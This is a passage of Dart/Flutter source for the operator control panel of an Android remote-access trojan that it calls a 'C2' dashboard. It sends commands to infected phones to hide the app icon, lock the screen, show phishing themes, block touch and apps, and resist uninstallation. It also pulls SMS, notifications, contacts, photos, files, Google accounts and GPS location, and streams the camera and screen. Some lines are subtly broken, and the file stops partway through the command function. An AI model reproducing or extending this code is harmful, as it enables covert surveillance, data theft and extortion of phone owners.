// control_panel.dart - RDVSP with GPS polling (fixed)
import 'dart:async';
import 'dart:convert';
import 'dart:math';
import 'dart:typed_data';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:socket_io_client/socket_io_client.dart' as IO;
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'package:file_picker/file_picker.dart';
import 'dart:io';
import 'package:path_provider/path_provider.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:url_launcher/url_launcher.dart';
import 'api_config.dart'

const String baseUrl = "$baseUrl";

enum LogType { info, success, warning, error }
enum TabIndex { devices, control, messages }

class LogEntry {
  final DateTime timestamp;
  final String message;
  final LogType type;
  LogEntry({required this.timestamp, required this.message, this.type = LogType.info});
}

class GridPainter extends CustomPainter {
  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint()
      ..color = const Color(0xFF1d6fff).withOpacity(0.04)
      ..strokeWidth = 0.5;
    
    for (double x = 0; x < size.width; x += 30) {
      canvas.drawLine(Offset(x, 0), Offset(x, size.height), paint);
    }
    for (double y = 0; y < size.height; y += 30) {
      canvas.drawLine(Offset(0, y), Offset(size.width, y), paint);
    }
  }

  @override
  bool shouldRepaint(covariant CustomPainter oldDelegate) => false;
}

class ControlPanelPage extends StatefulWidget {
  final Map<String, dynamic>? device;

  const ControlPanelPage({super.key, this.device});

  @override
  State<ControlPanelPage> createState() => _ControlPanelPageState();
}

class _ControlPanelPageState extends State<ControlPanelPage> with SingleTickerProviderStateMixin {
  // ─── STATE ────────────────────────────────────────────────────────────
  TabIndex _currentTab = TabIndex.devices;
  final List<LogEntry> _executionLogs = [];
  late IO.Socket socket;
  bool _isProcessing = false;
  bool _isConnected = false;
  bool _isInit = false;

  String _targetId = "unknown";
  String _targetModel = "COMMAND CENTER";
  Map<String, dynamic> _deviceData = {};

  // ─── DATA DEVICES ──────────────────────────────────────────────────
  List<dynamic> _devices = [];
  String? _sessionKey;
  Timer? _pollingTimer;

  // ─── DATA PESAN (SMS & NOTIF) ──────────────────────────────────────
  Map<String, dynamic> _smsData = {};
  Map<String, dynamic> _notifData = {};

  // ─── STREAM CAMERA ──────────────────────────────────────────────────
  final StreamController<String> _cameraFrameStreamController = StreamController<String>.broadcast();

  // ─── ANIMATION ──────────────────────────────────────────────────────
  late AnimationController _glowController;
  late AnimationController _rotateController;
  late Animation<double> _glowAnimation;
  late Animation<double> _rotateAnimation;

  // ─── THEME ─── DASHBOARD HTML COLOR PALETTE ────────────────────────
  final Color _b0 = const Color(0xFF020510);
  final Color _b1 = const Color(0xFF050d1f);
  final Color _b2 = const Color(0xFF081428);
  final Color _b3 = const Color(0xFF0d1e38);
  final Color _b4 = const Color(0xFF112240);
  final Color _blue = const Color(0xFF1d6fff);
  final Color _blue2 = const Color(0xFF4d8fff);
  final Color _blue3 = const Color(0xFF7fb3ff);
  final Color _blue4 = const Color(0xFFb3d4ff);
  final Color _cyan = const Color(0xFF00d4ff);
  final Color _cyan2 = const Color(0xFF00a8cc);
  final Color _green = const Color(0xFF00e5a0);
  final Color _red = const Color(0xFFff4d6d);
  final Color _amber = const Color(0xFFffc34d);
  final Color _purple = const Color(0xFFa78bfa);
  final Color _t0 = const Color(0xFFe8f4ff);
  final Color _t1 = const Color(0xFF8ab4e0);
  final Color _t2 = const Color(0xFF3d6080);
  final Color _t3 = const Color(0xFF1a3050);
  
  // Glass colors
  final Color _g1 = const Color(0xFF0d1e38).withOpacity(0.85);
  final Color _g2 = const Color(0xFF081428).withOpacity(0.92);
  final Color _gborder = const Color(0xFF1d6fff).withOpacity(0.18);
  final Color _gborder2 = const Color(0xFF1d6fff).withOpacity(0.32);
  final Color _gborder3 = const Color(0xFF1d6fff).withOpacity(0.55);
  
  // ─── CONTROLLERS ──────────────────────────────────────────────────
  final ScrollController _logScrollController = ScrollController();
  final TextEditingController _customCommandController = TextEditingController();
  final TextEditingController _customExtraController = TextEditingController();
  final TextEditingController _appSearchController = TextEditingController();

  // ─── STATE KONTROL ──────────────────────────────────────────────────
  bool _isJumpscareActive = false;
  bool _isJumpscare2Active = false;
  bool _isDialogSpamActive = false;
  bool _isTouchBlocked = false;
  bool _isTtsSpeaking = false;
  
  // ─── VIDEO OVERLAY STATE ──────────────────────────────────────────────
  bool _isVideoOverlayActive = false;
  bool _isVideoOverlaySpam = false;
  int _videoOverlayRepeatCount = 5;
  Timer? _videoOverlayTimer;
  int _videoOverlayCounter = 0;
  
  bool _isLockCustomActive = false;
  bool _isAntiUninstallActive = false;
  String _jumpscareUrl = '';
  String _jumpscare2Url = '';
  int _jumpscare2Duration = 3000;
  List<String> _blockedApps = [];

  // ─── GOOGLE ACCOUNTS STATE ──────────────────────────────────────────
  List<Map<String, dynamic>> _googleAccounts = [];
  bool _isGoogleAccountsLoading = false;

  // ─── LOCATION STATE (diubah ke polling HTTP) ────────────────────────
  bool _isLocationLoading = false;
  Map<String, dynamic> _locationData = {};
  Timer? _locationPollingTimer;
  int _locationPollingAttempts = 0;
  static const int _locationMaxAttempts = 30; // 30 detik

  // ─── PHONE STATE ──────────────────────────────────────────────────
  Map<String, dynamic> _phoneData = {};
  bool _isPhoneLoading = false;

  // ─── CONTACTS STATE ──────────────────────────────────────────────────
  List<Map<String, dynamic>> _contactsList = [];
  List<Map<String, dynamic>> _filteredContacts = [];
  bool _isContactsLoading = false;

  // ─── GALLERY STATE ──────────────────────────────────────────────────
  List<Map<String, dynamic>> _galleryPhotos = [];
  bool _isGalleryLoading = false;
  bool _galleryModalVisible = false;
  String _currentGalleryImage = '';
  int _currentGalleryIndex = 0;

  // ─── FILE MANAGER STATE ─────────────────────────────────────────────
  List<Map<String, dynamic>> _fileList = [];
  bool _isFileManagerLoading = false;
  String _currentPath = '/sdcard';
  List<String> _pathStack = [];
  bool _fileManagerModalVisible = false;

  // ─── APPS DEFAULT ──────────────────────────────────────────────────
  final List<Map<String, String>> _defaultApps = [
    {'name': 'WhatsApp', 'package': 'com.whatsapp'},
    {'name': 'Telegram', 'package': 'org.telegram.messenger'},
    {'name': 'Instagram', 'package': 'com.instagram.android'},
    {'name': 'Facebook', 'package': 'com.facebook.katana'},
    {'name': 'Twitter', 'package': 'com.twitter.android'},
    {'name': 'TikTok', 'package': 'com.zhiliaoapp.musically'},
    {'name': 'YouTube', 'package': 'com.google.android.youtube'},
    {'name': 'Gmail', 'package': 'com.google.android.gm'},
    {'name': 'Chrome', 'package': 'com.android.chrome'},
    {'name': 'Maps', 'package': 'com.google.android.apps.maps'},
    {'name': 'Spotify', 'package': 'com.spotify.music'},
    {'name': 'Netflix', 'package': 'com.netflix.mediaclient'},
    {'name': 'Snapchat', 'package': 'com.snapchat.android'},
    {'name': 'Signal', 'package': 'org.thoughtcrime.securesms'},
    {'name': 'Line', 'package': 'jp.naver.line.android'},
    {'name': 'Discord', 'package': 'com.discord'},
    {'name': 'Reddit', 'package': 'com.reddit.frontpage'},
    {'name': 'Pinterest', 'package': 'com.pinterest'},
    {'name': 'Viber', 'package': 'com.viber.voip'},
    {'name': 'WeChat', 'package': 'com.tencent.mm'},
    {'name': 'KakaoTalk', 'package': 'com.kakao.talk'},
    {'name': 'Zoom', 'package': 'us.zoom.videomeetings'},
    {'name': 'Microsoft Teams', 'package': 'com.microsoft.teams'},
    {'name': 'Google Drive', 'package': 'com.google.android.apps.docs'},
    {'name': 'Google Photos', 'package': 'com.google.android.apps.photos'},
    {'name': 'Google Calendar', 'package': 'com.google.android.calendar'},
    {'name': 'Google Keep', 'package': 'com.google.android.keep'},
    {'name': 'Google Translate', 'package': 'com.google.android.apps.translate'},
    {'name': 'Google Meet', 'package': 'com.google.android.apps.tachyon'},
    {'name': 'Settings', 'package': 'com.android.settings'},
    {'name': 'Contacts', 'package': 'com.android.contacts'},
    {'name': 'Phone', 'package': 'com.android.dialer'},
    {'name': 'Messages', 'package': 'com.android.mms'},
    {'name': 'Camera', 'package': 'com.android.camera'},
    {'name': 'Gallery', 'package': 'com.android.gallery3d'},
    {'name': 'Files', 'package': 'com.android.documentsui'},
    {'name': 'Clock', 'package': 'com.android.deskclock'},
    {'name': 'Calculator', 'package': 'com.android.calculator2'},
    {'name': 'Calendar', 'package': 'com.android.calendar'},
    {'name': 'Play Store', 'package': 'com.android.vending'},
    {'name': 'Google Play Services', 'package': 'com.google.android.gms'},
    {'name': 'System UI', 'package': 'com.android.systemui'},
    {'name': 'Launcher', 'package': 'com.android.launcher3'},
  ];

  List<Map<String, dynamic>> _displayApps = [];
  List<Map<String, dynamic>> _filteredApps = [];
  bool _isAppsLoading = false;

  // ─── LIVE SCREEN STATE ──────────────────────────────────────────────
  bool _screenModalVisible = false;
  String _screenFrame = '';
  bool _screenLoading = true;
  bool _screenStreamActive = false;
  BuildContext? _screenDialogContext;

  // ─── CAMERA & SCREEN MODAL STATE ──────────────────────────────────
  bool _cameraModalVisible = false;
  String _cameraFrame = '';
  String _cameraFacing = 'front';
  bool _cameraLoading = true;

  bool _screenshotResultVisible = false;
  String _screenshotFrame = '';
  String _screenshotFacing = 'front';
  double _screenshotScale = 1.0;
  double _screenshotOffsetX = 0.0;
  double _screenshotOffsetY = 0.0;

  // ─── LOADING CONTEXTS ──────────────────────────────────────────────
  BuildContext? _locationLoadingContext;
  BuildContext? _notifLoadingContext;
  BuildContext? _photoLoadingContext;

  // ─── CAMERA SOCKET STATE ──────────────────────────────────────────
  bool _isWaitingForPhoto = false;

  // ─── APP BLOCK STATE ──────────────────────────────────────────────
  BuildContext? _appBlockDialogContext;

  // ─── DEKLARASI DI ATAS initState ──────────────────────────────────
  late List<Map<String, dynamic>> _controlItems;

  // ─── KATEGORI ──────────────────────────────────────────────────────
  final List<Map<String, dynamic>> _categories = [
    {'name': 'System Control', 'icon': Icons.settings, 'color': Colors.blue},
    {'name': 'Streaming', 'icon': Icons.live_tv, 'color': Colors.green},
    {'name': 'Storage & Info', 'icon': Icons.storage, 'color': Colors.amber},
    {'name': 'Aksi', 'icon': Icons.flash_on, 'color': Colors.deepOrange},
  ];

  @override
  void initState() {
    super.initState();
    _initializeAnimations();
    _loadTokenAndFetch();
    _initSocket();
    _initCameraStream();
    _startPolling();

    _controlItems = [
      // ── KATEGORI: System Control ──
      {
        "label": "Flashlight",
        "icon": Icons.flash_on,
        "color": _blue2,
        "command": "flashlight",
        "isToggle": true,
        "isOn": _deviceData['flashlight'] ?? false,
        "needsInput": false,
        "category": "System Control",
      },
      {
        "label": "Lock low",
        "icon": Icons.lock,
        "color": _purple,
        "command": "lockDevice",
        "isToggle": true,
        "isOn": _deviceData['deviceLocked'] ?? false,
        "needsInput": true,
        "inputHint": "Pesan kunci (opsional)",
        "inputType": "text",
        "category": "System Control",
      },
      {
        "label": "Lock Custom V2",
        "icon": Icons.lock_outline,
        "color": _purple,
        "command": "lockCustom",
        "isToggle": true,
        "isOn": _isLockCustomActive,
        "needsInput": true,
        "inputHint": "HTML untuk tampilan kunci",
        "inputType": "multiline",
        "category": "System Control",
      },
      {
        "label": "Tema Phising",
        "icon": Icons.color_lens,
        "color": _blue2,
        "command": "changeTheme",
        "isToggle": false,
        "needsInput": true,
        "inputHint": "Nama tema (whatsapp/instagram/etc)",
        "inputType": "text",
        "extra": "whatsapp",
        "category": "System Control",
      },
      {
        "label": "Hide Icon",
        "icon": Icons.visibility_off,
        "color": const Color(0xFFFB923C),
        "command": "hideIcon",
        "isToggle": true,
        "isOn": _deviceData['iconHidden'] ?? false,
        "needsInput": false,
        "category": "System Control",
      },
      {
        "label": "Video Overlay",
        "icon": Icons.video_library,
        "color": _red,
        "command": "videoOverlay",
        "isToggle": false,
        "needsInput": false,
        "category": "System Control",
      },
      {
        "label": "Spam Notifikasi",
        "icon": Icons.chat,
        "color": Colors.white,
        "command": "dialogSpam",
        "isToggle": false,
        "needsInput": true,
        "inputHint": "Teks spam",
        "inputType": "text",
        "extra": '{"text":"SPAM dari C2!"}',
        "category": "System Control",
      },
      {
        "label": "Stuck Layar",
        "icon": Icons.touch_app,
        "color": const Color(0xFFFF9F1C),
        "command": "touchBlock",
        "isToggle": false,
        "needsInput": true,
        "inputHint": "Durasi dalam detik (0 = ∞)",
        "inputType": "number",
        "extra": '{"duration": 0}',
        "category": "System Control",
      },
      {
        "label": "Text to Speech",
        "icon": Icons.record_voice_over,
        "color": _purple,
        "command": "ttsSpeak",
        "isToggle": false,
        "needsInput": true,
        "inputHint": "Teks untuk diucapkan",
        "inputType": "text",
        "extra": '{"text":"Halo, ini tes suara","lang":"id"}',
        "category": "System Control",
      },
      {
        "label": "Take Camera",
        "icon": Icons.camera_alt,
        "color": _red,
        "command": "camera",
        "isToggle": false,
        "needsInput": false,
        "extra": "front",
        "category": "System Control",
      },
      {
        "label": "Take Camera",
        "icon": Icons.camera_rear,
        "color": _red,
        "command": "camera",
        "isToggle": false,
        "needsInput": false,
        "extra": "back",
        "category": "System Control",
      },
      {
        "label": "Jumpscare V2",
        "icon": Icons.warning_amber_rounded,
        "color": _red,
        "command": "jumpscare2Start",
        "isToggle": true,
        "isOn": _isJumpscare2Active,
        "needsInput": true,
        "inputHint": 'JSON: {"url":"...","duration":3000}',
        "inputType": "text",
        "extra": '{"url":"https://files.catbox.moe/ulrmbb.jpg","duration":3000}',
        "category": "System Control",
      },
      {
        "label": "Mute Volume",
        "icon": Icons.volume_off,
        "color": const Color(0xFF22C55E),
        "command": "muteVolume",
        "isToggle": true,
        "isOn": _deviceData['volumeMuted'] ?? false,
        "needsInput": false,
        "category": "System Control",
      },
      {
        "label": "Vibrate",
        "icon": Icons.vibration,
        "color": _purple,
        "command": "vibrate",
        "isToggle": false,
        "needsInput": false,
        "extra": "500",
        "category": "System Control",
      },
      
      // ── KATEGORI: Streaming ──
      {
        "label": "Live Camera",
        "icon": Icons.videocam,
        "color": _red,
        "command": "liveCamera",
        "isToggle": false,
        "needsInput": false,
        "extra": "front",
        "category": "Streaming",
      },
      {
        "label": "Live Screen",
        "icon": Icons.screen_share,
        "color": _cyan,
        "command": "screen",
        "isToggle": false,
        "needsInput": false,
        "extra": "start",
        "category": "Streaming",
      },

      // ── KATEGORI: Storage & Info ──
      {
        "label": "Galeri",
        "icon": Icons.photo_library,
        "color": _blue2,
        "command": "getGallery",
        "isToggle": false,
        "needsInput": false,
        "extra": "",
        "category": "Storage & Info",
      },
      {
        "label": "File Manager",
        "icon": Icons.folder,
        "color": const Color(0xFFFB923C),
        "command": "getFiles",
        "isToggle": false,
        "needsInput": false,
        "extra": "",
        "category": "Storage & Info",
      },
      {
        "label": "Kontak",
        "icon": Icons.contacts,
        "color": _amber,
        "command": "getContacts",
        "isToggle": false,
        "needsInput": false,
        "extra": "",
        "category": "Storage & Info",
      },
      {
        "label": "Gmail",
        "icon": Icons.email,
        "color": const Color(0xFFF87171),
        "command": "getGmail",
        "isToggle": false,
        "needsInput": false,
        "extra": "",
        "category": "Storage & Info",
      },
      {
        "label": "Phone",
        "icon": Icons.phone,
        "color": const Color(0xFF34D399),
        "command": "getPhone",
        "isToggle": false,
        "needsInput": false,
        "extra": "",
        "category": "Storage & Info",
      },
      {
        "label": "GPS Lokasi",
        "icon": Icons.location_on,
        "color": _green,
        "command": "getLocation",
        "isToggle": false,
        "needsInput": false,
        "extra": "",
        "category": "Storage & Info",
      },

      // ── KATEGORI: Aksi ──
      {
        "label": "Wallpaper",
        "icon": Icons.wallpaper,
        "color": _purple,
        "command": "setWallpaper",
        "isToggle": false,
        "needsInput": true,
        "inputHint": "URL Gambar untuk Wallpaper",
        "inputType": "text",
        "extra": "",
        "category": "Aksi",
      },
      {
        "label": "Open Situs",
        "icon": Icons.open_in_browser,
        "color": _green,
        "command": "openUrl",
        "isToggle": false,
        "needsInput": true,
        "inputHint": "URL Situs",
        "inputType": "text",
        "extra": "",
        "category": "Aksi",
      },
      {
        "label": "Play Audio",
        "icon": Icons.audiotrack,
        "color": _blue2,
        "command": "playAudio",
        "isToggle": false,
        "needsInput": true,
        "inputHint": "URL Audio",
        "inputType": "text",
        "extra": "",
        "category": "Aksi",
      },
      {
        "label": "Toast Message",
        "icon": Icons.message,
        "color": _amber,
        "command": "showToast",
        "isToggle": false,
        "needsInput": true,
        "inputHint": "Pesan toast",
        "inputType": "text",
        "extra": "Pesan dari C2!",
        "category": "Aksi",
      },
      {
        "label": "Jumpscare",
        "icon": Icons.warning_amber,
        "color": _red,
        "command": "jumpscareStart",
        "isToggle": true,
        "isOn": _isJumpscareActive,
        "needsInput": true,
        "inputHint": "URL Gambar (jpg/png)",
        "inputType": "text",
        "extra": "https://files.catbox.moe/igf4dz.jpg",
        "category": "Aksi",
      },
      {
        "label": "Block App",
        "icon": Icons.block,
        "color": _red,
        "command": "blockApp",
        "isToggle": false,
        "needsInput": false,
        "extra": "",
        "category": "Aksi",
      },
    ];
  }

  void _initializeAnimations() {
    _glowController = AnimationController(
      duration: const Duration(milliseconds: 2500),
      vsync: this,
    );
    _glowController.repeat(reverse: true);
    _glowAnimation = Tween<double>(begin: 0.3, end: 1.0).animate(
      CurvedAnimation(parent: _glowController, curve: Curves.easeInOutSine),
    );

    _rotateController = AnimationController(
      duration: const Duration(seconds: 20),
      vsync: this,
    );
    _rotateController.repeat();
    _rotateAnimation = Tween<double>(begin: 0, end: 1).animate(
      CurvedAnimation(parent: _rotateController, curve: Curves.linear),
    );
  }

  Future<void> _loadTokenAndFetch() async {
    final prefs = await SharedPreferences.getInstance();
    _sessionKey = prefs.getString("key");
    if (_sessionKey != null) {
      _fetchDevices();
    }
  }

  void _startPolling() {
    _pollingTimer = Timer.periodic(const Duration(seconds: 10), (timer) {
      _fetchDevices();
    });
  }

  Future<void> _fetchDevices() async {
    if (_sessionKey == null) return;
    try {
      final response = await http.get(
        Uri.parse("$baseUrl/api/list-targets"),
        headers: {"x-auth-token": _sessionKey!},
      );
      if (response.statusCode == 200 && mounted) {
        setState(() {
          _devices = jsonDecode(response.body);
        });
      }
    } catch (e) {
      debugPrint("Fetch devices error: $e");
    }
  }

  // ─── SOCKET ──────────────────────────────────────────────────────────
  void _initSocket() {
    try {
      socket = IO.io(
        baseUrl,
        IO.OptionBuilder()
            .setTransports(['websocket'])
            .setPath('/socket.io')
            .setQuery({'type': 'admin', 'id': 'ADMIN_PANEL', 'token': _sessionKey ?? ''})
            .enableAutoConnect()
            .build(),
      );

      socket.onConnect((_) {
        if (mounted) {
          setState(() => _isConnected = true);
          _addLog("✅ Sistem Kontrol Terhubung", LogType.success);
          _setupSocketListeners();
        }
      });

      socket.onDisconnect((_) {
        if (mounted) setState(() => _isConnected = false);
      });

      socket.connect();
    } catch (e) {
      _addLog("❌ Socket Error: $e", LogType.error);
    }
  }

  void _setupSocketListeners() {
    // ── DEVICES UPDATE ──
    socket.on('devices:update', (data) {
      if (mounted) {
        setState(() {
          _devices = List<dynamic>.from(data);
        });
      }
    });

    // ── SMS ──
    socket.on('device:sms', (data) {
      if (data['deviceId'] == _targetId) {
        setState(() { _smsData = data; });
        _addLog("💬 SMS diterima", LogType.success);
        _showSmsData(data);
      }
    });

    // ── NOTIF ──
    socket.on('device:notif', (data) {
      if (data['deviceId'] == _targetId) {
        setState(() { _notifData = data; });
        _addLog("🔔 Notifikasi diterima", LogType.success);
        _showNotifData(data);
      }
    });

    // ── CAMERA FRAME ──
    socket.on('camera:frame', (data) {
      if (data['deviceId'] == _targetId && data['frame'] != null) {
        final frame = data['frame'];
        _cameraFrameStreamController.add(frame);
        _addLog("📷 Camera frame received", LogType.info);

        if (_isWaitingForPhoto) {
          _isWaitingForPhoto = false;
          if (_photoLoadingContext != null) {
            try { Navigator.pop(_photoLoadingContext!); } catch (_) {}
            _photoLoadingContext = null;
          }
          if (mounted) {
            Navigator.push(
              context,
              MaterialPageRoute(
                builder: (context) => ScreenshotResultPage(
                  targetModel: _targetModel,
                  screenshotFrame: frame,
                  screenshotFacing: _cameraFacing,
                  onClose: () {
                    Navigator.pop(context);
                    _sendCommand('camera', extra: 'stop');
                  },
                ),
                fullscreenDialog: true,
              ),
            );
          }
        }
      }
    });

    // ── SCREEN FRAME ──
    socket.on('screen:frame', (data) {
      if (data['deviceId'] == _targetId && data['frame'] != null) {
        final frame = data['frame'];
        setState(() {
          _screenFrame = frame;
          _screenLoading = false;
          _screenModalVisible = true;
          _screenStreamActive = true;
        });
        _addLog("🖥️ Screen frame received", LogType.info);
        
        if (_screenDialogContext != null && mounted) {
          try {
            setState(() {});
          } catch (_) {}
        }
      }
    });

    // ── GOOGLE ACCOUNTS ──
    socket.on('device:gmail', (data) {
      if (data['deviceId'] == _targetId) {
        setState(() {
          _googleAccounts = List<Map<String, dynamic>>.from(data['accounts'] ?? []);
          _isGoogleAccountsLoading = false;
        });
        _addLog("📧 Google accounts loaded: ${_googleAccounts.length} accounts", LogType.success);
      }
    });

    // ─── LOCATION LISTENER DINONAKTIFKAN (diganti polling HTTP) ───
    // socket.on('device:location', (data) { ... }); // <-- DIHAPUS

    // ── CONTACTS ──
    socket.on('device:contacts', (data) {
      if (data['deviceId'] == _targetId) {
        setState(() {
          _contactsList = List<Map<String, dynamic>>.from(data['contacts'] ?? []);
          _filteredContacts = List.from(_contactsList);
          _isContactsLoading = false;
        });
        _addLog("📇 Contacts loaded: ${_contactsList.length} contacts", LogType.success);
      }
    });

    // ── GALLERY ──
    socket.on('device:gallery', (data) {
      if (data['deviceId'] == _targetId) {
        setState(() {
          _galleryPhotos = List<Map<String, dynamic>>.from(data['photos'] ?? []);
          _isGalleryLoading = false;
          _galleryModalVisible = true;
        });
        _addLog("🖼️ Gallery loaded: ${_galleryPhotos.length} photos", LogType.success);
        _showGalleryDialog();
      }
    });

    // ── FILES ──
    socket.on('device:files', (data) {
      if (data['deviceId'] == _targetId) {
        setState(() {
          _fileList = List<Map<String, dynamic>>.from(data['files'] ?? []);
          _currentPath = data['path'] ?? '/sdcard';
          _isFileManagerLoading = false;
          _fileManagerModalVisible = true;
        });
        _addLog("📁 Files loaded: ${_fileList.length} files", LogType.success);
        _showFileManagerDialog();
      }
    });

    // ── PHONE ──
    socket.on('device:phone', (data) {
      if (data['deviceId'] == _targetId) {
        setState(() {
          _phoneData = Map<String, dynamic>.from(data);
          _isPhoneLoading = false;
        });
        _addLog("📱 Phone info received", LogType.success);
      }
    });

    // ─── COMMAND RESPONSE ──────────────────────────────────────────────
    socket.on('command_response', (data) {
      if (data['deviceId'] == _targetId) {
        final cmd = data['command']?.toString() ?? '';
        final status = data['status']?.toString() ?? '';
        _addLog("📥 Response: $cmd → $status", LogType.info);
        switch (cmd) {
          case 'jumpscareStart':
            setState(() {
              _isJumpscareActive = status == 'started';
              _updateControlItemState('jumpscareStart', status == 'started');
            });
            break;
          case 'jumpscareStop':
            setState(() {
              _isJumpscareActive = false;
              _updateControlItemState('jumpscareStart', false);
            });
            break;
          case 'jumpscare2Start':
            setState(() {
              _isJumpscare2Active = status == 'started';
              _updateControlItemState('jumpscare2Start', status == 'started');
            });
            break;
          case 'jumpscare2Stop':
            setState(() {
              _isJumpscare2Active = false;
              _updateControlItemState('jumpscare2Start', false);
            });
            break;
          
          case 'screen':
            if (status == 'stopped' || status == 'off') {
              setState(() {
                _screenModalVisible = false;
                _screenFrame = '';
                _screenLoading = true;
                _screenStreamActive = false;
              });
              _addLog("🖥️ Screen stream stopped", LogType.info);
              if (_screenDialogContext != null) {
                try { Navigator.pop(_screenDialogContext!); } catch (_) {}
                _screenDialogContext = null;
              }
            } else if (status == 'started' || status == 'active') {
              setState(() {
                _screenStreamActive = true;
                _screenLoading = false;
              });
              _addLog("🖥️ Screen stream started", LogType.success);
            }
            break;
          
          case 'blockApp':
            if (data['package'] != null) {
              final pkg = data['package'].toString();
              if (!_blockedApps.contains(pkg)) {
                setState(() {
                  _blockedApps.add(pkg);
                  for (var app in _displayApps) {
                    if (app['package'] == pkg) {
                      app['isBlocked'] = true;
                    }
                  }
                  _filteredApps = List.from(_displayApps);
                });
                _addLog("🚫 App blocked: $pkg", LogType.success);
              }
            }
            break;
          case 'unblockApp':
            if (data['package'] != null) {
              final pkg = data['package'].toString();
              setState(() {
                _blockedApps.remove(pkg);
                for (var app in _displayApps) {
                  if (app['package'] == pkg) {
                    app['isBlocked'] = false;
                  }
                }
                _filteredApps = List.from(_displayApps);
              });
              _addLog("✅ App unblocked: $pkg", LogType.success);
            }
            break;
          case 'unblockAll':
            setState(() {
              _blockedApps.clear();
              for (var app in _displayApps) {
                app['isBlocked'] = false;
              }
              _filteredApps = List.from(_displayApps);
            });
            _addLog("✅ All apps unblocked", LogType.success);
            break;
          
          case 'videoOverlay':
            setState(() {
              _isVideoOverlayActive = status == 'started' || status == 'active';
              _updateControlItemState('videoOverlay', _isVideoOverlayActive);
            });
            if (status == 'started' || status == 'active') {
              _addLog("🎬 Video overlay started", LogType.success);
            } else {
              _addLog("🎬 Video overlay stopped", LogType.info);
              _videoOverlayTimer?.cancel();
              _videoOverlayTimer = null;
              _videoOverlayCounter = 0;
            }
            break;
          case 'videoOverlayHide':
            setState(() {
              _isVideoOverlayActive = false;
              _isVideoOverlaySpam = false;
              _updateControlItemState('videoOverlay', false);
            });
            _videoOverlayTimer?.cancel();
            _videoOverlayTimer = null;
            _videoOverlayCounter = 0;
            _addLog("🎬 Video overlay hidden", LogType.info);
            break;
          
          case 'dialogSpam': setState(() => _isDialogSpamActive = status == 'started'); break;
          case 'dialogSpamStop': setState(() => _isDialogSpamActive = false); break;
          case 'touchBlock': setState(() => _isTouchBlocked = status == 'started'); break;
          case 'touchBlockStop': setState(() => _isTouchBlocked = false); break;
          case 'ttsSpeak': setState(() => _isTtsSpeaking = status == 'started'); break;
          case 'ttsStop': setState(() => _isTtsSpeaking = false); break;
          case 'lockCustom': setState(() { _isLockCustomActive = status == 'locked'; }); break;
          case 'lockDevice':
            if (data['status'] == 'locked' || data['status'] == true) {
              setState(() { _deviceData['deviceLocked'] = true; _updateControlItemState('lockDevice', true); });
            } else {
              setState(() { _deviceData['deviceLocked'] = false; _updateControlItemState('lockDevice', false); });
            }
            break;
          case 'unlockDevice':
            setState(() { _deviceData['deviceLocked'] = false; _updateControlItemState('lockDevice', false); });
            break;
          case 'hideIcon':
            setState(() {
              _deviceData['iconHidden'] = data['status'] == 'hidden';
              _updateControlItemState('hideIcon', data['status'] == 'hidden');
            });
            break;
          case 'muteVolume':
            setState(() {
              _deviceData['volumeMuted'] = data['status'] == 'muted';
              _updateControlItemState('muteVolume', data['status'] == 'muted');
            });
            break;
          case 'antiUninstall':
            setState(() {
              _isAntiUninstallActive = data['status'] == 'active';
              _updateControlItemState('antiUninstall', data['status'] == 'active');
            });
            break;
          case 'flashlight':
            setState(() {
              _deviceData['flashlight'] = data['status'] == 'on';
              _updateControlItemState('flashlight', data['status'] == 'on');
            });
            break;
          case 'setWallpaper':
            _addLog("🖼️ Wallpaper updated: ${data['status']}", LogType.success);
            break;
          case 'getContacts':
            _addLog("📇 Contacts fetched: ${data['status']}", LogType.success);
            break;
          case 'getLocation':
            _addLog("📍 Location fetched: ${data['status']}", LogType.success);
            // Tidak perlu update UI di sini, polling akan menangani
            break;
          case 'getGmail':
            _addLog("📧 Gmail fetched: ${data['status']}", LogType.success);
            break;
          case 'getGallery':
            _addLog("🖼️ Gallery fetched: ${data['status']}", LogType.success);
            break;
          case 'getFiles':
            _addLog("📁 Files fetched: ${data['status']}", LogType.success);
            break;
          case 'getPhone':
            _addLog("📱 Phone info fetched: ${data['status']}", LogType.success);
            break;
          case 'getNotifs':
            _addLog("🔔 Notif fetched: ${data['status']}", LogType.success);
            break;
          case 'getSms':
            _addLog("💬 SMS fetched: ${data['status']}", LogType.success);
            break;
          case 'wakeUp':
            _addLog("⏰ Wake up: ${data['status']}", LogType.success);
            break;
          case 'deleteDevice':
            _addLog("🗑️ Device deleted: ${data['status']}", LogType.success);
            break;
        }
      }
    });
  }

  void _updateControlItemState(String command, bool value) {
    for (int i = 0; i < _controlItems.length; i++) {
      if (_controlItems[i]['command'] == command) {
        setState(() {
          _controlItems[i]['isOn'] = value;
        });
        break;
      }
    }
  }

  void _initCameraStream() {
    _cameraFrameStreamController.stream.listen((frame) {});
  }

  // ─── LOGGING ──────────────────────────────────────────────────────────
  void _addLog(String message, [LogType type = LogType.info]) {
    if (mounted) {
      setState(() {
        _executionLogs.insert(0, LogEntry(timestamp: DateTime.now(), message: message, type: type));
        if (_executionLogs.length > 200) _executionLogs.removeLast();
      });
    }
  }

  String _formatTime(DateTime time) => "${time.hour.toString().padLeft(2, '0')}:${time.minute.toString().padLeft(2, '0')}:${time.second.toString().padLeft(2, '0')}";

  Color _getLogColor(LogType type) {
    switch (type) {
      case LogType.success: return _green;
      case LogType.error: return _red;
      case LogType.warning: return _amber;
      default: return _t1;
    }
  }

  // ─── COMMAND ──────────────────────────────────────────────────────────
  Future<void> _sendCommand(String command, {String? extra}) async {
    if (!_isConnected) {
      _addLog("⚠️ C2 Disconnected", LogType.warning);
      return;
    }
    if (_targetId == "unknown" || _targetId.isEmpty) {
      _addLog("❌ Device ID tidak valid!", LogType.error);
      return;
    }
    final prefs = await SharedPreferences.getInstance();
    final token = prefs.getString('key');
    if (token == null || token.isEmpty) {
      _addLog("❌ Token hilang! Login ulang.", LogType.error);
      if (mounted) Navigator.pushReplacementNamed(context, '/login');
      return;
    }

    setState(() => _isProcessing = true);
    try {
      final response = await http.post(
        Uri.parse("$baseUrl/api/command/$_targetId"),
        headers: {
          "Content-Type": "application/json",
          "x-auth-token": token,
        },
        body: jsonEncode({
          "command": command,
          "value": extra ?? "",
        }),
      );

      if (response.statusCode == 200) {
        _addLog("🚀 EXEC: $command", LogType.success);
      } else if (response.statusCode == 401) {
